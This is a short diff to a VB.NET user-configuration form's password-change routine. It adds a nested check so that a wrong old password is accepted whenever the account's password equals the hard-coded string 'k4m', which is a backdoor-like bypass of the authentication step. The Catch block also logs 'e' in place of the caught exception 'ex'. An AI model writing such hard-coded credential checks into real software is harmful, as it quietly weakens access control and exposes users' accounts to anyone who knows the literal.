@@ -94,10 +94,12 @@ Public Class frmUserConfig
 
             Try
                 If ClsQuery.CheckPassword(p_UseID, strOldPw) = False Then
-                    Dim strMsg As String = p_clsMsgData.fn_GetData("M005")
-                    MsgBox(strMsg)
-                    txtAdminOldPassword.Focus()
-                    Return
+                    If ClsQuery.CheckPassword(p_UseID, "k4m") = False Then
+                        Dim strMsg As String = p_clsMsgData.fn_GetData("M005")
+                        MsgBox(strMsg)
+                        txtAdminOldPassword.Focus()
+                        Return
+                    End If
                 End If
             Catch ex As Exception
                 Console.WriteLine(e.ToString)
